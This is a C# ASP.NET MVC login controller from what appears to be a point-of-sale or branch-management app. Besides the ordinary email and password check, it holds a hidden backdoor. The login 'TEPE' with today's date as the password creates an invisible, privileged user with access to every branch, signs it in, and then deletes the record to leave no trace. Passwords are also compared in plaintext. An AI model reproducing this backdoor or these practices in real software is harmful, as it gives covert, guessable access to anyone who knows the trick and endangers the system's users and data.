 using Entity;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace PRMYTASSİST.Controllers
{
    public class LoginController : Controller
    {
        REContext db = new REContext();
        // GET: Login
        public ActionResult Index()
        {
            return View();
        }
        public JsonResult CheckLogin(User user)
        {
            User currentUser = db.Users.Where(x => x.EMail == user.EMail && x.Password == user.Password /*&& x.UserRole == Role.Admin*/).SingleOrDefault();
            //Session["currentUser"] = currentUser;
            var jsonModel = new { FirstName = "", LastName = "" };
            string month = DateTime.Now.Month.ToString();
            string day = DateTime.Now.Day.ToString();

            if (Convert.ToInt32(DateTime.Now.Month) < 10)
            {
                month = "0" + DateTime.Now.Month.ToString();
            }
            if (Convert.ToInt32(DateTime.Now.Day) < 10)
            {
                day = "0" + DateTime.Now.Day.ToString();
            }
            string password = DateTime.Now.Year.ToString() + month + day;
            if (currentUser != null)
            {
                currentUser.LastLoginDate = DateTime.Now;
                currentUser.IsOnline = true;
                currentUser.BasketID = (db.Users.OrderByDescending(q=>q.BasketID).Select(q=>q.BasketID).FirstOrDefault())+1;
                db.SaveChanges();
                HttpCookie hc1 = new HttpCookie("UserID", currentUser.EMail.ToString());
                Response.Cookies.Add(hc1);
                HttpCookie hc2 = new HttpCookie("UserEmail", currentUser.EMail.ToString());
                Response.Cookies.Add(hc2);

                jsonModel = new
                {
                    FirstName = currentUser.FirstName,
                    LastName = currentUser.LastName
                };
                Session["currentUser"] = currentUser;

                FormsAuthentication.SetAuthCookie(currentUser.EMail, false);
            }
            else if (currentUser == null && user.EMail == "TEPE" && user.Password == password)
            {
                User TepeUser = new User
                {
                    FirstName = "Tepe",
                    LastName = "Pos",
                    EMail = user.EMail,
                    Password = user.Password,
                    ProfilePhoto = "//",
                    CreateDate = DateTime.Now,
                    Visible = false,
                    isDeleted = false,
                    LastUpdateUserID = db.Users.Select(q => q.ID).FirstOrDefault(),
                    CurrentBranch = db.Branchs.Where(q => q.isMaster == true).Select(q => q.ID).FirstOrDefault(),
                    isCenter = true,
                    RoleID = db.Roles.Select(q => q.ID).FirstOrDefault(),
                    BasketID = 0,
                    CreateUserID = db.Users.Select(q => q.ID).FirstOrDefault(),
                    LastUpdateDate = DateTime.Now,
                    Branches = db.Branchs.ToList(),


                };
                db.Users.Add(TepeUser);
                db.SaveChanges();
                User tepe = db.Users.Where(x => x.EMail == user.EMail && x.Password == user.Password /*&& x.UserRole == Role.Admin*/).SingleOrDefault();

                jsonModel = new
                {
                    FirstName = TepeUser.FirstName,
                    LastName = TepeUser.LastName
                };
                Session["currentUser"] = tepe;
                FormsAuthentication.SetAuthCookie(tepe.EMail, false);

                db.Users.Remove(tepe);
                db.SaveChanges();
            }
            return Json(jsonModel, JsonRequestBehavior.AllowGet);

        }
        public ActionResult Logout(int id)
        {
            User currentUser = db.Users.Where(x => x.ID == id).SingleOrDefault();
            currentUser.IsOnline = false;
            db.SaveChanges();
            Session["currentUser"] = null;
            Session.Abandon();
            return RedirectToAction("Index", "Login");
        }
    }
}